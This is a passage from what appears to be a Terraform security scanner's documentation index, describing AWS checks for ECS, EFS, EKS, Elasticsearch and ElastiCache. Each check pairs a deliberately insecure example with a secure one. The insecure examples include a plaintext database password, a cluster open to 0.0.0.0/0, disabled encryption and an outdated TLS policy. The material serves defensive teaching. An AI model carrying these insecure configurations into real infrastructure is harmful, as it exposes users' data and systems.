\"bad_example\" {\n    name = \"services-cluster\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ecs/enable-container-insight/#secure-example","text":"<p>The following example will pass the aws-ecs-enable-container-insight check. <pre><code> resource \"aws_ecs_cluster\" \"good_example\" {\n    name = \"services-cluster\"\n\n    setting {\n      name  = \"containerInsights\"\n      value = \"enabled\"\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ecs/enable-container-insight/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_cluster#setting</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/ContainerInsights.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ecs/enable-in-transit-encryption/","text":"","title":"ECS Task Definitions with EFS volumes should use in-transit encryption"},{"location":"checks/aws/ecs/enable-in-transit-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/ecs/enable-in-transit-encryption/#explanation","text":"<p>ECS task definitions that have volumes using EFS configuration should explicitly enable in transit encryption to prevent the risk of data loss due to interception.</p>","title":"Explanation"},{"location":"checks/aws/ecs/enable-in-transit-encryption/#possible-impact","text":"<p>Intercepted traffic to and from EFS may lead to data loss</p>","title":"Possible Impact"},{"location":"checks/aws/ecs/enable-in-transit-encryption/#suggested-resolution","text":"<p>Enable in transit encryption when using efs</p>","title":"Suggested Resolution"},{"location":"checks/aws/ecs/enable-in-transit-encryption/#insecure-example","text":"<p>The following example will fail the aws-ecs-enable-in-transit-encryption check. <pre><code> resource \"aws_ecs_task_definition\" \"bad_example\" {\n    family                = \"service\"\n    container_definitions = file(\"task-definitions/service.json\")\n\n    volume {\n      name = \"service-storage\"\n\n      efs_volume_configuration {\n        file_system_id          = aws_efs_file_system.fs.id\n        root_directory          = \"/opt/data\"\n        authorization_config {\n          access_point_id = aws_efs_access_point.test.id\n          iam             = \"ENABLED\"\n        }\n      }\n    }\n   }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ecs/enable-in-transit-encryption/#secure-example","text":"<p>The following example will pass the aws-ecs-enable-in-transit-encryption check. <pre><code> resource \"aws_ecs_task_definition\" \"good_example\" {\n    family                = \"service\"\n    container_definitions = file(\"task-definitions/service.json\")\n\n    volume {\n      name = \"service-storage\"\n\n      efs_volume_configuration {\n        file_system_id          = aws_efs_file_system.fs.id\n        root_directory          = \"/opt/data\"\n        transit_encryption      = \"ENABLED\"\n        transit_encryption_port = 2999\n        authorization_config {\n          access_point_id = aws_efs_access_point.test.id\n          iam             = \"ENABLED\"\n        }\n      }\n    }\n   }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ecs/enable-in-transit-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_task_definition#transit_encryption</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonECS/latest/userguide/efs-volumes.html</p> </li> <li> <p>https://docs.aws.amazon.com/efs/latest/ug/encryption-in-transit.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ecs/no-plaintext-secrets/","text":"","title":"Task definition defines sensitive environment variable(s)."},{"location":"checks/aws/ecs/no-plaintext-secrets/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/ecs/no-plaintext-secrets/#explanation","text":"<p>You should not make secrets available to a user in plaintext in any scenario. Secrets can instead be pulled from a secure secret storage system by the service requiring them.</p>","title":"Explanation"},{"location":"checks/aws/ecs/no-plaintext-secrets/#possible-impact","text":"<p>Sensitive data could be exposed in the AWS Management Console</p>","title":"Possible Impact"},{"location":"checks/aws/ecs/no-plaintext-secrets/#suggested-resolution","text":"<p>Use secrets for the task definition</p>","title":"Suggested Resolution"},{"location":"checks/aws/ecs/no-plaintext-secrets/#insecure-example","text":"<p>The following example will fail the aws-ecs-no-plaintext-secrets check. <pre><code> resource \"aws_ecs_task_definition\" \"bad_example\" {\n   container_definitions = &lt;&lt;EOF\n [\n   {\n     \"name\": \"my_service\",\n     \"essential\": true,\n     \"memory\": 256,\n     \"environment\": [\n       { \"name\": \"ENVIRONMENT\", \"value\": \"development\" },\n       { \"name\": \"DATABASE_PASSWORD\", \"value\": \"oh no D:\"}\n     ]\n   }\n ]\n EOF\n\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ecs/no-plaintext-secrets/#secure-example","text":"<p>The following example will pass the aws-ecs-no-plaintext-secrets check. <pre><code> resource \"aws_ecs_task_definition\" \"good_example\" {\n   container_definitions = &lt;&lt;EOF\n [\n   {\n     \"name\": \"my_service\",\n     \"essential\": true,\n     \"memory\": 256,\n     \"environment\": [\n       { \"name\": \"ENVIRONMENT\", \"value\": \"development\" }\n     ]\n   }\n ]\n EOF\n\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ecs/no-plaintext-secrets/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_task_definition</p> </li> <li> <p>https://docs.aws.amazon.com/systems-manager/latest/userguide/integration-ps-secretsmanager.html</p> </li> <li> <p>https://www.vaultproject.io/</p> </li> </ul>","title":"Links"},{"location":"checks/aws/efs/","text":"","title":"efs"},{"location":"checks/aws/efs/#checks","text":"<ul> <li>enable-at-rest-encryption EFS Encryption has not been enabled</li> </ul>","title":"Checks"},{"location":"checks/aws/efs/enable-at-rest-encryption/","text":"","title":"EFS Encryption has not been enabled"},{"location":"checks/aws/efs/enable-at-rest-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/efs/enable-at-rest-encryption/#explanation","text":"<p>If your organization is subject to corporate or regulatory policies that require encryption of data and metadata at rest, we recommend creating a file system that is encrypted at rest, and mounting your file system using encryption of data in transit.</p>","title":"Explanation"},{"location":"checks/aws/efs/enable-at-rest-encryption/#possible-impact","text":"<p>Data can be read from the EFS if compromised</p>","title":"Possible Impact"},{"location":"checks/aws/efs/enable-at-rest-encryption/#suggested-resolution","text":"<p>Enable encryption for EFS</p>","title":"Suggested Resolution"},{"location":"checks/aws/efs/enable-at-rest-encryption/#insecure-example","text":"<p>The following example will fail the aws-efs-enable-at-rest-encryption check. <pre><code> resource \"aws_efs_file_system\" \"bad_example\" {\n   name       = \"bar\"\n   encrypted  = false\n   kms_key_id = \"\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/efs/enable-at-rest-encryption/#secure-example","text":"<p>The following example will pass the aws-efs-enable-at-rest-encryption check. <pre><code> resource \"aws_efs_file_system\" \"good_example\" {\n   name       = \"bar\"\n   encrypted  = true\n   kms_key_id = \"my_kms_key\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/efs/enable-at-rest-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/efs_file_system</p> </li> <li> <p>https://docs.aws.amazon.com/efs/latest/ug/encryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/eks/","text":"","title":"eks"},{"location":"checks/aws/eks/#checks","text":"<ul> <li> <p>enable-control-plane-logging EKS Clusters should have cluster control plane logging turned on</p> </li> <li> <p>encrypt-secrets EKS should have the encryption of secrets enabled</p> </li> <li> <p>no-public-cluster-access EKS Clusters should have the public access disabled</p> </li> <li> <p>no-public-cluster-access-to-cidr EKS cluster should not have open CIDR range for public access</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/eks/enable-control-plane-logging/","text":"","title":"EKS Clusters should have cluster control plane logging turned on"},{"location":"checks/aws/eks/enable-control-plane-logging/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/eks/enable-control-plane-logging/#explanation","text":"<p>By default cluster control plane logging is not turned on. Logging is available for audit, api, authenticator, controllerManager and scheduler. All logging should be turned on for cluster control plane.</p>","title":"Explanation"},{"location":"checks/aws/eks/enable-control-plane-logging/#possible-impact","text":"<p>Logging provides valuable information about access and usage</p>","title":"Possible Impact"},{"location":"checks/aws/eks/enable-control-plane-logging/#suggested-resolution","text":"<p>Enable logging for the EKS control plane</p>","title":"Suggested Resolution"},{"location":"checks/aws/eks/enable-control-plane-logging/#insecure-example","text":"<p>The following example will fail the aws-eks-enable-control-plane-logging check. <pre><code> resource \"aws_eks_cluster\" \"bad_example\" {\n     encryption_config {\n         resources = [ \"secrets\" ]\n         provider {\n             key_arn = var.kms_arn\n         }\n     }\n\n     name = \"bad_example_cluster\"\n     role_arn = var.cluster_arn\n     vpc_config {\n         endpoint_public_access = false\n     }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/eks/enable-control-plane-logging/#secure-example","text":"<p>The following example will pass the aws-eks-enable-control-plane-logging check. <pre><code> resource \"aws_eks_cluster\" \"good_example\" {\n     encryption_config {\n         resources = [ \"secrets\" ]\n         provider {\n             key_arn = var.kms_arn\n         }\n     }\n\n    enabled_cluster_log_types = [\"api\", \"authenticator\", \"audit\", \"scheduler\", \"controllerManager\"]\n\n     name = \"good_example_cluster\"\n     role_arn = var.cluster_arn\n     vpc_config {\n         endpoint_public_access = false\n     }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/eks/enable-control-plane-logging/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#enabled_cluster_log_types</p> </li> <li> <p>https://docs.aws.amazon.com/eks/latest/userguide/control-plane-logs.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/eks/encrypt-secrets/","text":"","title":"EKS should have the encryption of secrets enabled"},{"location":"checks/aws/eks/encrypt-secrets/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/eks/encrypt-secrets/#explanation","text":"<p>EKS cluster resources should have the encryption_config block set with protection of the secrets resource.</p>","title":"Explanation"},{"location":"checks/aws/eks/encrypt-secrets/#possible-impact","text":"<p>EKS secrets could be read if compromised</p>","title":"Possible Impact"},{"location":"checks/aws/eks/encrypt-secrets/#suggested-resolution","text":"<p>Enable encryption of EKS secrets</p>","title":"Suggested Resolution"},{"location":"checks/aws/eks/encrypt-secrets/#insecure-example","text":"<p>The following example will fail the aws-eks-encrypt-secrets check. <pre><code> resource \"aws_eks_cluster\" \"bad_example\" {\n     name = \"bad_example_cluster\"\n\n     role_arn = var.cluster_arn\n     vpc_config {\n         endpoint_public_access = false\n     }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/eks/encrypt-secrets/#secure-example","text":"<p>The following example will pass the aws-eks-encrypt-secrets check. <pre><code> resource \"aws_eks_cluster\" \"good_example\" {\n     encryption_config {\n         resources = [ \"secrets\" ]\n         provider {\n             key_arn = var.kms_arn\n         }\n     }\n\n     name = \"good_example_cluster\"\n     role_arn = var.cluster_arn\n     vpc_config {\n         endpoint_public_access = false\n     }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/eks/encrypt-secrets/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#encryption_config</p> </li> <li> <p>https://aws.amazon.com/about-aws/whats-new/2020/03/amazon-eks-adds-envelope-encryption-for-secrets-with-aws-kms/</p> </li> </ul>","title":"Links"},{"location":"checks/aws/eks/no-public-cluster-access/","text":"","title":"EKS Clusters should have the public access disabled"},{"location":"checks/aws/eks/no-public-cluster-access/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/eks/no-public-cluster-access/#explanation","text":"<p>EKS clusters are available publicly by default, this should be explicitly disabled in the vpc_config of the EKS cluster resource.</p>","title":"Explanation"},{"location":"checks/aws/eks/no-public-cluster-access/#possible-impact","text":"<p>EKS can be access from the internet</p>","title":"Possible Impact"},{"location":"checks/aws/eks/no-public-cluster-access/#suggested-resolution","text":"<p>Don't enable public access to EKS Clusters</p>","title":"Suggested Resolution"},{"location":"checks/aws/eks/no-public-cluster-access/#insecure-example","text":"<p>The following example will fail the aws-eks-no-public-cluster-access check. <pre><code> resource \"aws_eks_cluster\" \"bad_example\" {\n     // other config \n\n     name = \"bad_example_cluster\"\n     role_arn = var.cluster_arn\n     vpc_config {\n        endpoint_public_access = true\n        public_access_cidrs = [\"0.0.0.0/0\"]\n     }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/eks/no-public-cluster-access/#secure-example","text":"<p>The following example will pass the aws-eks-no-public-cluster-access check. <pre><code> resource \"aws_eks_cluster\" \"good_example\" {\n     // other config \n\n     name = \"good_example_cluster\"\n     role_arn = var.cluster_arn\n     vpc_config {\n         endpoint_public_access = false\n     }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/eks/no-public-cluster-access/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#endpoint_public_access</p> </li> <li> <p>https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/eks/no-public-cluster-access-to-cidr/","text":"","title":"EKS cluster should not have open CIDR range for public access"},{"location":"checks/aws/eks/no-public-cluster-access-to-cidr/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/eks/no-public-cluster-access-to-cidr/#explanation","text":"<p>EKS Clusters have public access cidrs set to 0.0.0.0/0 by default which is wide open to the internet. This should be explicitly set to a more specific private CIDR range</p>","title":"Explanation"},{"location":"checks/aws/eks/no-public-cluster-access-to-cidr/#possible-impact","text":"<p>EKS can be accessed from the internet</p>","title":"Possible Impact"},{"location":"checks/aws/eks/no-public-cluster-access-to-cidr/#suggested-resolution","text":"<p>Don't enable public access to EKS Clusters</p>","title":"Suggested Resolution"},{"location":"checks/aws/eks/no-public-cluster-access-to-cidr/#insecure-example","text":"<p>The following example will fail the aws-eks-no-public-cluster-access-to-cidr check. <pre><code> resource \"aws_eks_cluster\" \"bad_example\" {\n     // other config \n\n     name = \"bad_example_cluster\"\n     role_arn = var.cluster_arn\n     vpc_config {\n         endpoint_public_access = true\n     }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/eks/no-public-cluster-access-to-cidr/#secure-example","text":"<p>The following example will pass the aws-eks-no-public-cluster-access-to-cidr check. <pre><code> resource \"aws_eks_cluster\" \"good_example\" {\n     // other config \n\n     name = \"good_example_cluster\"\n     role_arn = var.cluster_arn\n     vpc_config {\n         endpoint_public_access = true\n         public_access_cidrs = [\"10.2.0.0/8\"]\n     }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/eks/no-public-cluster-access-to-cidr/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#vpc_config</p> </li> <li> <p>https://docs.aws.amazon.com/eks/latest/userguide/create-public-private-vpc.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/elastic-search/","text":"","title":"elastic-search"},{"location":"checks/aws/elastic-search/#checks","text":"<ul> <li> <p>enable-domain-encryption Elasticsearch domain isn't encrypted at rest.</p> </li> <li> <p>enable-domain-logging Domain logging should be enabled for Elastic Search domains</p> </li> <li> <p>enable-in-transit-encryption Elasticsearch domain uses plaintext traffic for node to node communication.</p> </li> <li> <p>enforce-https Elasticsearch doesn't enforce HTTPS traffic.</p> </li> <li> <p>use-secure-tls-policy Elasticsearch domain endpoint is using outdated TLS policy.</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/elastic-search/enable-domain-encryption/","text":"","title":"Elasticsearch domain isn't encrypted at rest."},{"location":"checks/aws/elastic-search/enable-domain-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/elastic-search/enable-domain-encryption/#explanation","text":"<p>You should ensure your Elasticsearch data is encrypted at rest to help prevent sensitive information from being read by unauthorised users.</p>","title":"Explanation"},{"location":"checks/aws/elastic-search/enable-domain-encryption/#possible-impact","text":"<p>Data will be readable if compromised</p>","title":"Possible Impact"},{"location":"checks/aws/elastic-search/enable-domain-encryption/#suggested-resolution","text":"<p>Enable ElasticSearch domain encryption</p>","title":"Suggested Resolution"},{"location":"checks/aws/elastic-search/enable-domain-encryption/#insecure-example","text":"<p>The following example will fail the aws-elastic-search-enable-domain-encryption check. <pre><code> resource \"aws_elasticsearch_domain\" \"bad_example\" {\n   domain_name = \"domain-foo\"\n\n   encrypt_at_rest {\n     enabled = false\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/elastic-search/enable-domain-encryption/#secure-example","text":"<p>The following example will pass the aws-elastic-search-enable-domain-encryption check. <pre><code> resource \"aws_elasticsearch_domain\" \"good_example\" {\n   domain_name = \"domain-foo\"\n\n   encrypt_at_rest {\n     enabled = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/elastic-search/enable-domain-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#encrypt_at_rest</p> </li> <li> <p>https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/encryption-at-rest.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/elastic-search/enable-domain-logging/","text":"","title":"Domain logging should be enabled for Elastic Search domains"},{"location":"checks/aws/elastic-search/enable-domain-logging/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/elastic-search/enable-domain-logging/#explanation","text":"<p>Amazon ES exposes four Elasticsearch logs through Amazon CloudWatch Logs: error logs, search slow logs, index slow logs, and audit logs. </p> <p>Search slow logs, index slow logs, and error logs are useful for troubleshooting performance and stability issues. </p> <p>Audit logs track user activity for compliance purposes. </p> <p>All the logs are disabled by default.</p>","title":"Explanation"},{"location":"checks/aws/elastic-search/enable-domain-logging/#possible-impact","text":"<p>Logging provides vital information about access and usage</p>","title":"Possible Impact"},{"location":"checks/aws/elastic-search/enable-domain-logging/#suggested-resolution","text":"<p>Enable logging for ElasticSearch domains</p>","title":"Suggested Resolution"},{"location":"checks/aws/elastic-search/enable-domain-logging/#insecure-example","text":"<p>The following example will fail the aws-elastic-search-enable-domain-logging check. <pre><code> resource \"aws_elasticsearch_domain\" \"bad_example\" {\n   domain_name           = \"example\"\n   elasticsearch_version = \"1.5\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/elastic-search/enable-domain-logging/#secure-example","text":"<p>The following example will pass the aws-elastic-search-enable-domain-logging check. <pre><code> resource \"aws_elasticsearch_domain\" \"good_example\" {\n   domain_name           = \"example\"\n   elasticsearch_version = \"1.5\"\n\n   log_publishing_options {\n     cloudwatch_log_group_arn = aws_cloudwatch_log_group.example.arn\n     log_type                 = \"AUDIT_LOGS\"\n     enabled                  = true  \n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/elastic-search/enable-domain-logging/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#log_type</p> </li> <li> <p>https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/es-createdomain-configure-slow-logs.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/elastic-search/enable-in-transit-encryption/","text":"","title":"Elasticsearch domain uses plaintext traffic for node to node communication."},{"location":"checks/aws/elastic-search/enable-in-transit-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/elastic-search/enable-in-transit-encryption/#explanation","text":"<p>Traffic flowing between Elasticsearch nodes should be encrypted to ensure sensitive data is kept private.</p>","title":"Explanation"},{"location":"checks/aws/elastic-search/enable-in-transit-encryption/#possible-impact","text":"<p>In transit data between nodes could be read if intercepted</p>","title":"Possible Impact"},{"location":"checks/aws/elastic-search/enable-in-transit-encryption/#suggested-resolution","text":"<p>Enable encrypted node to node communication</p>","title":"Suggested Resolution"},{"location":"checks/aws/elastic-search/enable-in-transit-encryption/#insecure-example","text":"<p>The following example will fail the aws-elastic-search-enable-in-transit-encryption check. <pre><code> resource \"aws_elasticsearch_domain\" \"bad_example\" {\n   domain_name = \"domain-foo\"\n\n   node_to_node_encryption {\n     enabled = false\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/elastic-search/enable-in-transit-encryption/#secure-example","text":"<p>The following example will pass the aws-elastic-search-enable-in-transit-encryption check. <pre><code> resource \"aws_elasticsearch_domain\" \"good_example\" {\n   domain_name = \"domain-foo\"\n\n   node_to_node_encryption {\n     enabled = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/elastic-search/enable-in-transit-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#encrypt_at_rest</p> </li> <li> <p>https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/ntn.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/elastic-search/enforce-https/","text":"","title":"Elasticsearch doesn't enforce HTTPS traffic."},{"location":"checks/aws/elastic-search/enforce-https/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/elastic-search/enforce-https/#explanation","text":"<p>Plain HTTP is unencrypted and human-readable. This means that if a malicious actor was to eavesdrop on your connection, they would be able to see all of your data flowing back and forth.</p> <p>You should use HTTPS, which is HTTP over an encrypted (TLS) connection, meaning eavesdroppers cannot read your traffic.</p>","title":"Explanation"},{"location":"checks/aws/elastic-search/enforce-https/#possible-impact","text":"<p>HTTP traffic can be intercepted and the contents read</p>","title":"Possible Impact"},{"location":"checks/aws/elastic-search/enforce-https/#suggested-resolution","text":"<p>Enforce the use of HTTPS for ElasticSearch</p>","title":"Suggested Resolution"},{"location":"checks/aws/elastic-search/enforce-https/#insecure-example","text":"<p>The following example will fail the aws-elastic-search-enforce-https check. <pre><code> resource \"aws_elasticsearch_domain\" \"bad_example\" {\n   domain_name = \"domain-foo\"\n\n   domain_endpoint_options {\n     enforce_https = false\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/elastic-search/enforce-https/#secure-example","text":"<p>The following example will pass the aws-elastic-search-enforce-https check. <pre><code> resource \"aws_elasticsearch_domain\" \"good_example\" {\n   domain_name = \"domain-foo\"\n\n   domain_endpoint_options {\n     enforce_https = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/elastic-search/enforce-https/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#enforce_https</p> </li> <li> <p>https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/es-data-protection.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/elastic-search/use-secure-tls-policy/","text":"","title":"Elasticsearch domain endpoint is using outdated TLS policy."},{"location":"checks/aws/elastic-search/use-secure-tls-policy/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/elastic-search/use-secure-tls-policy/#explanation","text":"<p>You should not use outdated/insecure TLS versions for encryption. You should be using TLS v1.2+.</p>","title":"Explanation"},{"location":"checks/aws/elastic-search/use-secure-tls-policy/#possible-impact","text":"<p>Outdated SSL policies increase exposure to known vulnerabilities</p>","title":"Possible Impact"},{"location":"checks/aws/elastic-search/use-secure-tls-policy/#suggested-resolution","text":"<p>Use the most modern TLS/SSL policies available</p>","title":"Suggested Resolution"},{"location":"checks/aws/elastic-search/use-secure-tls-policy/#insecure-example","text":"<p>The following example will fail the aws-elastic-search-use-secure-tls-policy check. <pre><code> resource \"aws_elasticsearch_domain\" \"bad_example\" {\n   domain_name = \"domain-foo\"\n\n   domain_endpoint_options {\n     enforce_https = true\n     tls_security_policy = \"Policy-Min-TLS-1-0-2019-07\"\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/elastic-search/use-secure-tls-policy/#secure-example","text":"<p>The following example will pass the aws-elastic-search-use-secure-tls-policy check. <pre><code> resource \"aws_elasticsearch_domain\" \"good_example\" {\n   domain_name = \"domain-foo\"\n\n   domain_endpoint_options {\n     enforce_https = true\n     tls_security_policy = \"Policy-Min-TLS-1-2-2019-07\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/elastic-search/use-secure-tls-policy/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#tls_security_policy</p> </li> <li> <p>https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/es-data-protection.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/elasticache/","text":"","title":"elasticache"},{"location":"checks/aws/elasticache/#checks","text":"<ul> <li> <p>add-description-for-security-group Missing description for security group/security group rule.</p> </li> <li> <p>enable-at-rest-encryption Elasticache Replication Group stores unencrypted data at-rest.</p> </li> <li> <p>enable-backup-retention Redis cluster should have backup retention turned on</p> </li> <li> <p>enable-in-transit-encryption Elasticache Replication Group uses unencrypted traffic.</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/elasticache/add-description-for-security-group/","text":"","title":"Missing description for security group/security group rule."},{"location":"checks/aws/elasticache/add-description-for-security-group/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/elasticache/add-description-for-security-group/#explanation","text":"<p>Security groups and security group rules should include a description for auditing purposes.</p> <p>Simplifies auditing, debugging, and managing security groups.</p>","title":"Explanation"},{"location":"checks/aws/elasticache/add-description-for-security-group/#possible-impact","text":"<p>Descriptions provide context for the firewall rule reasons</p>","title":"Possible Impact"},{"location":"checks/aws/elasticache/add-description-for-security-group/#suggested-resolution","text":"<p>Add descriptions for all security groups and rules</p>","title":"Suggested Resolution"},{"location":"checks/aws/elasticache/add-description-for-security-group/#insecure-example","text":"<p>The following example will fail the aws-elasticache-add-description-for-security-group check. <pre><code>resource \"aws_security_group\" \"bar\" {\n    name = \"security-group\"\n}\n\nresource \"aws_elasticache_security_group\" \"bad_example\" {\n    name = \"elasticache-security-group\"\n    security_group_names = [aws_security_group.bar.name]\n    description = \"\"\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/elasticache/add-description-for-security-group/#secure-example","text":"<p>The following example will pass the aws-elasticache-add-description-for-security-group check. <pre><code>resource \"aws_security_group\" \"bar\" {\n    name = \"security-group\"\n}\n\nresource \"aws_elasticache_security_group\" \"good_example\" {\n    name = \"elasticache-security-group\"\n    security_group_names = [aws_security_group.bar.name]\n    description = \"something\"\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/elasticache/add-description-for-security-group/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_security_group#description</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonElastiCache/latest/mem-ug/SecurityGroups.Creating.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/elasticache/enable-at-rest-encryption/","text":"","title":"Elasticache Replication Group stores unencrypted data at-rest."},{"location":"checks/aws/elasticache/enable-at-rest-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/elasticache/enable-at-rest-encryption/#explanation","text":"<p>Data stored within an Elasticache replication node should be encrypted to ensure sensitive data is kept private.</p>","title":"Explanation"},{"location":"checks/aws/elasticache/enable-at-rest-encryption/#possible-impact","text":"<p>At-rest data in the Replication Group could be compromised if accessed.</p>","title":"Possible Impact"},{"location":"checks/aws/elasticache/enable-at-rest-encryption/#suggested-resolution","text":"<p>Enable at-rest encryption for replication group</p>","title":"Suggested Resolution"},{"location":"checks/aws/elasticache/enable-at-rest-encryption/#insecure-example","text":"<p>The following example will fail the aws-elasticache-enable-at-rest-encryption check. <pre><code> resource \"aws_elasticache_replication_group\" \"bad_example\" {\n         replication_group_id = \"foo\"\n         replication_group_description = \"my foo cluster\"\n\n         at_rest_encryption_enabled = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/elasticache/enable-at-rest-encryption/#secure-example","text":"<p>The following example will pass the aws-elasticache-enable-at-rest-encryption check. <pre><code> resource \"aws_elasticache_replication_group\" \"good_example\" {\n         replication_group_id = \"foo\"\n         replication_group_description = \"my foo cluster\"\n\n         at_rest_encryption_enabled = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/elasticache/enable-at-rest-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_replication_group#at_rest_encryption_enabled</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonElastiCache/latest/red-ug/at-rest-encryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/elasticache/enable-backup-retention/","text":"","title":"Redis cluster should have backup retention turned on"},{"location":"checks/aws/elasticache/enable-backup-retention/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/elasticache/enable-backup-retention/#explanation","text":"<p>Redis clusters should have a snapshot retention time to ensure that they are backed up and can be restored if required.</p>","title":"Explanation"},{"location":"checks/aws/elasticache/enable-backup-retention/#possible-impact","text":"<p>Without backups of the redis cluster recovery is made difficult</p>","title":"Possible Impact"},{"location":"checks/aws/elasticache/enable-backup-retention/#suggested-resolution","text":"<p>Configure snapshot retention for redis cluster</p>","title":"Suggested Resolution"},{"location":"checks/aws/elasticache/enable-backup-retention/#insecure-example","text":"<p>The following example will fail the aws-elasticache-enable-backup-retention check. <pre><code> resource \"aws_elasticache_cluster\" \"bad_example\" {\n    cluster_id           = \"cluster-example\"\n    engine               = \"redis\"\n    node_type            = \"cache.m4.large\"\n    num_cache_nodes      = 1\n    parameter_group_name = \"default.redis3.2\"\n    engine_version       = \"3.2.10\"\n    port                 = 6379\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/elasticache/enable-backup-retention/#secure-example","text":"<p>The following example will pass the aws-elasticache-enable-backup-retention check. <pre><code> resource \"aws_elasticache_cluster\" \"good_example\" {\n    cluster_id           = \"cluster-example\"\n    engine               = \"redis\"\n    node_type            = \"cache.m4.large\"\n    num_cache_nodes      = 1\n    parameter_group_name = 